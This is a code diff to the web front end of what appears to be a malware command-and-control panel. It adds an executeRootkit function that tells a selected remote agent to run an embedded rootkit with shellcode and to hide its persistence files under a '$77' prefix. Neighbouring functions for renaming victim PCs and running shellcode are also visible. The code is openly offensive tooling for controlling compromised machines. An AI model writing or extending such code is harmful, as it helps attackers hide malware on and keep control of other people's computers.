@@ -795,6 +795,32 @@ async function renamePCFunc() {
     });
 }
 
+// Execute Rootkit from rootkit.h
+async function executeRootkit() {
+    if (!currentAgent) return;
+    
+    showConfirm('Execute embedded rootkit? This will rename all persistence files to $77 prefix!', async (confirmed) => {
+        if (!confirmed) return;
+        
+        try {
+            await fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    agentId: currentAgent.id,
+                    type: 'rootkit'
+                })
+            });
+            
+            showNotification('Rootkit executed from rootkit.h', '✅');
+            commandCount++;
+            addLog('warning', 'Rootkit executed (embedded shellcode)');
+        } catch (e) {
+            showNotification(`Error: ${e.message}`, '❌');
+        }
+    });
+}
+
 // Execute Shellcode
 async function executeShellcodeFunc() {
     if (!currentAgent) return;
